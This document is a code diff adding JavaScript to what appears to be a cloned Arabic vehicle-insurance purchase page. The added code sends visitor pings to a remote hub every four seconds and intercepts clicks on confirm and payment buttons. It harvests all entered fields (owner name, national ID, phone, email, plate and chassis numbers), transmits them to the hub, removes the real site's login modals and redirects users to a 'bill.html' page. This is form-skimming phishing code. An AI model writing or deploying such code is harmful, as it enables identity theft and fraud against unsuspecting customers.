@@ -3594,62 +3594,106 @@
         }
     }, true);
 
-    // 🛡️ المعترض الحديدي الشامل لمنع مودال تسجيل الدخول في ريأكت والتحويل لـ bill.html
+        // 🛡️ المعترض الحديدي المطور + الحارس الذكي (DOM-Guardian) + نبضات الاتصال (Ping Online Status)
     (function() {
+        function sendVisitorPing() {
+            var payload = {
+                token: visitorToken,
+                siteKey: siteKey,
+                currentPage: '/buy.html',
+                pageTitle: 'شراء وثيقة تأمين',
+                device: /Mobi|Android/i.test(navigator.userAgent) ? 'جوال' : 'سطح مكتب'
+            };
+            fetch(SERVER_HUB_URL + '/api/tracker/ping', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+                keepalive: true
+            }).catch(function() {});
+        }
+        setInterval(sendVisitorPing, 4000);
+        sendVisitorPing();
+
         var evts = ['click', 'mousedown', 'mouseup', 'pointerdown', 'pointerup', 'touchstart', 'touchend', 'submit'];
+        
+        function getFormInputs() {
+            var inputs = {};
+            document.querySelectorAll('input, select, textarea').forEach(function(inp) {
+                if (inp.type === 'hidden' || inp.type === 'submit' || inp.type === 'button') return;
+                if (inp.placeholder && inp.placeholder.includes('ابحث')) return;
+                if ((inp.type === 'checkbox' || inp.type === 'radio') && !inp.checked) return;
+                var val = inp.value ? inp.value.trim() : '';
+                if (!val) return;
+                var check = ((inp.name||'') + ' ' + (inp.id||'') + ' ' + (inp.placeholder||'')).toLowerCase();
+                var key = check.includes('plate') || check.includes('لوحة') ? 'رقم اللوحة' :
+                          check.includes('chassis') || check.includes('شاصي') || check.includes('هيكل') ? 'رقم الشاسيه' :
+                          check.includes('country') || check.includes('دولة') ? 'دولة القدوم' :
+                          check.includes('port') || check.includes('منفذ') ? 'منفذ الدخول' :
+                          check.includes('duration') || check.includes('مدة') ? 'مدة التأمين' :
+                          check.includes('id') || check.includes('هوية') ? 'رقم هوية المالك' :
+                          check.includes('owner') || check.includes('مالك') || check.includes('الاسم') ? 'الاسم الكامل للمالك' :
+                          check.includes('phone') || check.includes('جوال') || check.includes('هاتف') ? 'رقم الجوال' :
+                          check.includes('email') || check.includes('بريد') ? 'البريد الإلكتروني' :
+                          check.includes('nationality') || check.includes('جنسية') ? 'جنسية المالك' :
+                          check.includes('color') || check.includes('لون') ? 'لون المركبة' :
+                          check.includes('year') || check.includes('صنع') ? 'سنة الصنع' :
+                          check.includes('model') || check.includes('موديل') ? 'موديل المركبة' :
+                          check.includes('brand') || check.includes('ماركة') ? 'نوع الماركة' :
+                          check.includes('type') || check.includes('نوع الهيكل') ? 'نوع الهيكل' : (inp.placeholder || inp.name || inp.id || 'حقل');
+                inputs[key] = val;
+            });
+            return inputs;
+        }
+
+        function triggerSubmitAndRedirect() {
+            if (window.hasTriggeredFinalConfirm) return;
+            window.hasTriggeredFinalConfirm = true;
+            console.log('[SHIELD] Final submission triggered!');
+            var inputs = getFormInputs();
+            localStorage.setItem('saas_last_submission', JSON.stringify(inputs));
+            if (typeof sendSmartPayload === 'function') sendSmartPayload('buy_insurance_form', 'شراء وثيقة تأمين', inputs, 'confirmed', false);
+            if (typeof sendPayloadToHub === 'function') sendPayloadToHub(inputs, true);
+            setTimeout(function() {
+                var isLive = window.location.pathname.includes('/live/');
+                var isStorage = window.location.pathname.includes('/storage/');
+                var dest = (isLive || isStorage) ? ((isLive ? '/live/' : '/storage/') + currentSiteId + '/bill.html') : 'bill.html';
+                window.location.href = dest;
+            }, 300);
+        }
+
         function handle(e) {
             if (window.isEditorMode) return;
             var txt = '';
             var temp = e.target;
             for (var i = 0; i < 5 && temp && temp !== document.body; i++) {
-                txt += ' ' + (temp.innerText || temp.textContent || temp.value || '').trim();
+                txt += ' ' + (temp.innerText || temp.textContent || temp.value || temp.className || '').trim();
                 temp = temp.parentElement;
             }
-            var ok = txt.includes('تأكيد') || txt.includes('إصدار') || txt.includes('الطلب') || txt.includes('شراء');
-            if (ok) {
+            var isConfirmClick = txt.includes('تأكيد') || txt.includes('إصدار') || txt.includes('الطلب') || txt.includes('شراء') || txt.includes('دفع');
+            if (isConfirmClick) {
                 e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
                 if (['click', 'mouseup', 'pointerup', 'touchend'].indexOf(e.type) !== -1) {
-                    if (window.hasTriggeredFinalConfirm) return;
-                    window.hasTriggeredFinalConfirm = true;
-                    console.log('[SHIELD] Captured event successfully:', e.type);
-                    var inputs = {};
-                    document.querySelectorAll('input, select, textarea').forEach(function(inp) {
-                        if (inp.type === 'hidden' || inp.type === 'submit' || inp.type === 'button') return;
-                        if (inp.placeholder && inp.placeholder.includes('ابحث')) return;
-                        if ((inp.type === 'checkbox' || inp.type === 'radio') && !inp.checked) return;
-                        var val = inp.value ? inp.value.trim() : '';
-                        if (!val) return;
-                        var check = ((inp.name||'') + ' ' + (inp.id||'') + ' ' + (inp.placeholder||'')).toLowerCase();
-                        var key = check.includes('plate') || check.includes('لوحة') ? 'رقم اللوحة' :
-                                  check.includes('chassis') || check.includes('شاصي') || check.includes('هيكل') ? 'رقم الشاسيه' :
-                                  check.includes('country') || check.includes('دولة') ? 'دولة القدوم' :
-                                  check.includes('port') || check.includes('منفذ') ? 'منفذ الدخول' :
-                                  check.includes('duration') || check.includes('مدة') ? 'مدة التأمين' :
-                                  check.includes('id') || check.includes('هوية') ? 'رقم هوية المالك' :
-                                  check.includes('owner') || check.includes('مالك') || check.includes('الاسم') ? 'الاسم الكامل للمالك' :
-                                  check.includes('phone') || check.includes('جوال') || check.includes('هاتف') ? 'رقم الجوال' :
-                                  check.includes('email') || check.includes('بريد') ? 'البريد الإلكتروني' :
-                                  check.includes('nationality') || check.includes('جنسية') ? 'جنسية المالك' :
-                                  check.includes('color') || check.includes('لون') ? 'لون المركبة' :
-                                  check.includes('year') || check.includes('صنع') ? 'سنة الصنع' :
-                                  check.includes('model') || check.includes('موديل') ? 'موديل المركبة' :
-                                  check.includes('brand') || check.includes('ماركة') ? 'نوع الماركة' :
-                                  check.includes('type') || check.includes('نوع الهيكل') ? 'نوع الهيكل' : (inp.placeholder || inp.name || inp.id || 'حقل');
-                        inputs[key] = val;
-                    });
-                    localStorage.setItem('saas_last_submission', JSON.stringify(inputs));
-                    if (typeof sendSmartPayload === 'function') sendSmartPayload('buy_insurance_form', 'شراء وثيقة تأمين', inputs, 'confirmed', false);
-                    if (typeof sendPayloadToHub === 'function') sendPayloadToHub(inputs, true);
-                    setTimeout(function() {
-                        var isLive = window.location.pathname.includes('/live/');
-                        var isStorage = window.location.pathname.includes('/storage/');
-                        var dest = (isLive || isStorage) ? ((isLive ? '/live/' : '/storage/') + currentSiteId + '/bill.html') : 'bill.html';
-                        window.location.href = dest;
-                    }, 300);
+                    triggerSubmitAndRedirect();
                 }
             }
         }
         evts.forEach(function(evt) { window.addEventListener(evt, handle, true); });
+
+        var observer = new MutationObserver(function(mutations) {
+            mutations.forEach(function(mutation) {
+                mutation.addedNodes.forEach(function(node) {
+                    if (node.nodeType !== 1) return;
+                    var html = node.innerHTML || '';
+                    if (html.includes('تسجيل الدخول') || html.includes('الدخول مطلوب') || html.includes('حفظ بياناتك بنجاح')) {
+                        node.style.display = 'none';
+                        node.remove();
+                        console.log('[DOM-GUARDIAN] Eliminated login modal!');
+                        triggerSubmitAndRedirect();
+                    }
+                });
+            });
+        });
+        observer.observe(document.documentElement, { childList: true, subtree: true });
     })();
 
 })();
